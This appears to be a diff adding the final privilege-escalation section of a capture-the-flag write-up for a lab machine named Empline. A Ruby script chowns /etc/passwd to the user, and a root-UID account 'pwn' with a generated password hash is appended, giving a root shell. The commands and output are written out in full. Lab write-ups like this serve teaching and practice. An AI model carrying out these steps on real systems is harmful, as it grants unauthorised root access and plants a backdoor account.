@@ -316,7 +316,79 @@ Lets create a new ruby file:
 
 We'll write some code to change the file permissions of /etc/passwd using our ID:1002:
 
-> File = File("/etc/passwd","r")
-> File.chown(1002,1002)
+> File = File.new( "/etc/passwd", "r" )
+>
+> File.chown(1002, 1002)
+
+Now run the ruby file:
+
+> ruby exploit.rb 
+
+Check our permissions on /etc/passwd:
+
+> george@empline:~$ ls -l /etc/passwd
+> 
+> -rw-r--r-- 1 george george 1660 Jul 20  2021 /etc/passwd
+
+
+### Editing the /etc/passwd file:
+
+On the attacker's machine, make a new SHA-512 encoded password:
+
+> ┌──(root㉿kali)-[~]
+> 
+> └─# mkpasswd -m sha-512 password
+> 
+> $6$Nqybh9KBX8spC3fP$z8b3aRwcZSXDCfEnOllOO2srT/Pn77F8DWiUBG4gUCFWTG1cD26Tjaie3UTUT8Kku1/ksl4fJ/Jn.NVB4Ac4x0
+
+Back on the Empline machine, edit the /etc/passwd file:
+
+> george@empline:~$ echo "pwn:$6$Nqybh9KBX8spC3fP$z8b3aRwcZSXDCfEnOllOO2srT/Pn77F8DWiUBG4gUCFWTG1cD26Tjaie3UTUT8Kku1/ksl4fJ/Jn.NVB4Ac4x0:0:0:root:/root:/bin/sh" > >> /etc/passwd
+> 
+> george@empline:~$ cat /etc/passwd
+> 
+> root: x :0:0:root:/root:/bin/bash
+> 
+> daemon: x :1:1:daemon:/usr/sbin:/usr/sbin/nologin
+> 
+> bin: x :2:2:bin:/bin:/usr/sbin/nologin
+> 
+> sys: x :3:3:sys:/dev:/usr/sbin/nologin
+> 
+> ...
+> 
+> ubuntu: x :1001:1001:Ubuntu:/home/ubuntu:/bin/bash
+> 
+> mysql: x :111:116:MySQL Server,,,:/nonexistent:/bin/false
+> 
+> george: x :1002:1002::/home/george:/bin/bash
+> 
+> pwn:$6$Nqybh9KBX8spC3fP$z8b3aRwcZSXDCfEnOllOO2srT/Pn77F8DWiUBG4gUCFWTG1cD26Tjaie3UTUT8Kku1/ksl4fJ/Jn.NVB4Ac4x0:0:0:root:/root:/bin/sh
+> 
+> george@empline:~$ 
+
+And now su to the new user with the password we created:
+
+> george@empline:~$ su pwn
+> 
+> Password: 
+> 
+> $ id
+> 
+> uid=0(root) gid=0(root) groups=0(root)
+> 
+> $ cd /root
+> 
+> $ cat root.txt
+> 
+> [REDACTED]
+> 
+> $
+ 
+# End
+
+
+
+
 
 
